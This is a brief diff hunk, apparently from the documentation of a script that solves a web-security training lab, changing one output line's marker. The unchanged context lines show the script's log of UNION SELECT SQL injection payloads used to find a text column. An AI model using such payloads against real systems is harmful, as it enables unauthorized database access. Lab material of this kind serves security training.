@@ -27,5 +27,5 @@
 [*] Trying payload: ' UNION SELECT 'tJRvKS', null, null-- -
 [*] Trying payload: ' UNION SELECT null, 'tJRvKS', null-- -
 [#] the column containing text: 2
-[#] Check your browser, it should be marked now as solved
+🗹 Check your browser, it should be marked now as solved
 ```
